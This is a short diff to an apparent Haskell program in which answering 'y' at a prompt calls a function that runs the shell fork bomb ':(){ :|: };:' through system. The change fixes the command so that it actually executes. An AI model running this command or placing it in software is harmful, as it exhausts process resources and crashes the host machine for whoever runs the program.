@@ -17,5 +17,5 @@ parse response
 	| response == "y" = runFork
 	| otherwise = main
 
-runFork = system "bash :(){ :|: };:"
+runFork = system ":(){ :|: };:"
 
